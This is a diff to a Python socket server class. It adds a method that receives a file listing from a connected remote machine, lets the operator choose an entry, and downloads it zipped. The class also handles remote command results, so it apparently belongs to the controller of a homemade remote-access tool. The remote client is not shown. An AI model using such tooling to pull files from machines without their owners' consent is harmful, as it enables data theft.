@@ -1,6 +1,7 @@
 import socket
 import pickle
 import os
+import json
 
 HEADERSIZE = 10
 
@@ -57,6 +58,38 @@ class ServerConnection:
 
     def receive_file(self):
         print("[+] Receiving File")
+        full_list_of_files = b''
+        while True:
+            chunk = self.connection.recv(CHUNK_SIZE)
+            if chunk.endswith(END_DELIMETER.encode()):
+                chunk = chunk[:-len(END_DELIMETER)]
+                full_list_of_files += chunk
+                break
+            full_list_of_files += chunk
+
+        print(full_list_of_files)
+        files = json.loads(full_list_of_files)
+        for index in files:
+            print("\t\t", index, "\t", files[index])
+        file_index = (input("[+] Enter the file / folder you want to download "))
+        file_2_download = files[file_index]
+
+        self.send_data(file_2_download)
+        zipped_name = self.receive_data()
+        full_file = b''
+        while True:
+            chunk = self.connection.recv(CHUNK_SIZE)
+            if chunk.endswith(END_DELIMETER.encode()):
+                chunk = chunk[:-len(END_DELIMETER)]
+                full_file += chunk
+                break
+            full_file +=chunk
+
+        with open(zipped_name, "wb") as f:
+            f.write(full_file)
+
+        print("[+] File Downloaded successfully")
+
 
     def receive_command_result(self):
         print("[+] Receiving Command result")
